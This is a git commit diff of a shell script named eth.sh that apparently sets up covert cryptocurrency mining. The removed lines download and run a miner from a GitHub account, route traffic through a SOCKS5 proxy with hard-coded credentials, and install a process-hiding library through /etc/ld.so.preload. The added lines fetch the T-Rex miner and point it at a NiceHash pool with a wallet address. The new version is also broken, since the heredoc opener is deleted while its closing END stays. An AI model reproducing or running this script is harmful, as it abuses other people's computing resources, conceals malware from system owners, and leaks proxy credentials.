a5253e1b218f58ab1045695f08f800d91a26a037
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-04-18 14:21:19 +0700

    Update eth.sh

--- eth.sh
+++ eth.sh
@@ -1,48 +1,8 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
+#!/bin/sh 
 listen = :2233
 loglevel = 1
-socks5 = 52.15.235.202:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+socks5 = 20.107.53.168:1080
+socks5_username = jangankendor
+socks5_password = Gaskanpol 
+END 
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -zxvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a AUTOLYKOS2 -o autolykos.usa-west.nicehash.com:3390 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo $(shuf -i 1-9999 -n 1)-Trex) -p x --no-nvml
